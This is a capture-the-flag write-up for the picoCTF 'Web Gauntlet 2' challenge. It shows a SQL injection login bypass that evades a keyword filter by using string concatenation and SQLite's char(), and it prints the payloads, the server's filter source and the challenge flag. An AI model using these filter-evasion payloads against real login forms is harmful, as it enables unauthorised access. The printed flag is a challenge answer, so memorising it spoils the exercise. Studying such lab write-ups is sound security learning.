# **_Web Gauntlet 2_**
## Description
This website looks familiar... Log in as admin Site: `http://mercury.picoctf.net:21336/` Filter: `http://mercury.picoctf.net:21336/filter.php`
## Solution
Try login as a random user, the page gives the sql statement, which makes it easier for us to bypass
>SELECT username, password FROM users WHERE username='test' AND password='test'

The `filter.php` page also lists the filtered characters
>Filters: or and true false union like = > < ; -- /* */ admin

The word `admin` is filtered, we can bypass it by using `||`, which is used for string concatenates in most `RDBMS` 
However the password field is still there, `;` `--` `/* */` are all filtered, so we can neither end the statement nor comment them
`or` and `true false unions` are filtered too so we won't be able to just return `true` for password validation
`Char()` returns the character of the `ascii` code in it, 
```console
sqlite> select char(110);
n
```
Tricky thing, it ignores the string inside
```console
sqlite> select char('asdf');

```
Lets wrap every thing we dont want with `char()` 
> SELECT username, password FROM users WHERE username='admi'||'n'||char(' AND password=')''

This should result in 
```console
sqlite> select 'admi'||'n'||char(' AND password=')'';
admin
```
Which is 
> SELECT username, password FROM users WHERE username=admin

But this didn't work for some reason, I supose that `char(' AND password=')` does return something non-visible, maybe a space, but does affect the `admin` string, so I decided to make it return the letter `n`
Pass in `admi'||char(` for `username` and `-0+110)||'` for `password`
>SELECT username, password FROM users WHERE username='admi'||char(' AND password='-0+110)||''

Which results in
```console
sqlite> select 'admi'||char(' AND password='-0+110)||'';
admin
```
It worked this time, go to `filter.php` and get the flag
```html
<?php
session_start();

if (!isset($_SESSION["winner2"])) {
    $_SESSION["winner2"] = 0;
}
$win = $_SESSION["winner2"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner2"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner2"] = 0;
}

// picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}
?>
```
